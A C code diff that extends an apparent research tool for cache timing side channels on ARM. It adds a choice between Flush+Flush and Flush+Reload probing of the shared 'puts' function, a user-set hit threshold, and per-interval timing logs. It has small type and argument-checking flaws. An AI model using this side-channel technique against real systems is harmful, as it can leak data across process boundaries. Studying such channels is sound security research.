@@ -10,6 +10,7 @@
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <sys/types.h>
+#include <string.h>
 
 #include "flush.h"
 #include "sharedmem.h"
@@ -26,8 +27,28 @@ static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid,
 }
 
 
-int main()
+int main(int argc, char* argv[])
 {   
+    uint8_t mode = 42;
+    // check if F+F or F+R
+    if(strcmp(argv[1],"FF")==0)
+    {
+        mode = 0; 
+        printf("FF");
+    }
+    if(strcmp(argv[1],"FR")==0)
+    {
+        mode = 1;
+        printf("FR");
+    }
+    if(mode==42) // if mode is neither FF nor FR
+    {
+        printf("Error: Unknown Mode\n");
+        printf("ARGS should look like: <mode>\n");
+        printf("with <mode>: FF, FR\n");
+        exit(1);
+    }
+    
     // setting up PERF_COUNT_HW_CPU_CYCLES
     struct perf_event_attr pe;
     uint64_t count;
@@ -47,10 +68,21 @@ int main()
         exit(EXIT_FAILURE);
     }
 
-    // calc threshold
-    uint64_t threshold = flush_flush_threshold(puts, pe, count, fd);
+    // calc threshold depending on mode (FF=0,FR=1)
+    uint64_t threshold;
+    if(!mode) // FF
+    {
+        threshold = flush_flush_threshold(puts, pe, count, fd);
+    }
+    if(mode) // FR
+    {
+        threshold = flush_reload_threshold(puts, pe, count, fd);
+    }
 
-    printf("Recommended Threshold: %lli\n", threshold);
+    printf("Recommended threshold is: %lli\n",threshold);
+    printf("threshold: ");
+    scanf("%li", &threshold);
+
 
     // set up timing sync
 
@@ -59,6 +91,7 @@ int main()
     uint64_t start_nsec;
     uint64_t start_sec;
     uint64_t interval = 100000000;
+    uint64_t store; // used to cache data during F+R
     uint64_t hits = 0;
     uint64_t miss = 0;
 
@@ -71,21 +104,40 @@ int main()
         start_nsec = time.tv_nsec;
         start_sec = time.tv_sec;
 
+        if(mode) // F+R
+        {
+            // data, instruction barrier
+            asm volatile ("DSB SY");
+            asm volatile ("ISB");
+            ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+            ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
 
-        // data, instruction barrier
-        asm volatile ("DSB SY");
-        asm volatile ("ISB");
-        ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-        ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+            store = *((uint64_t*)&puts);
 
-        flush_cache_line(puts);
+            // data, instruction barrier
+            asm volatile ("DSB SY");
+            asm volatile ("ISB");
 
-        // data, instruction barrier
-        asm volatile ("DSB SY");
-        asm volatile ("ISB");
+            ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+            read(fd, &count, sizeof(long long));
+        }
+        else // F+F
+        {
+            // data, instruction barrier
+            asm volatile ("DSB SY");
+            asm volatile ("ISB");
+            ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+            ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
 
-        ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-        read(fd, &count, sizeof(long long));
+            flush_cache_line(puts);
+
+            // data, instruction barrier
+            asm volatile ("DSB SY");
+            asm volatile ("ISB");
+
+            ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+            read(fd, &count, sizeof(long long));
+        }
 
         fprintf(fp_exec,"%lli\n", count);
         if(count<=threshold)
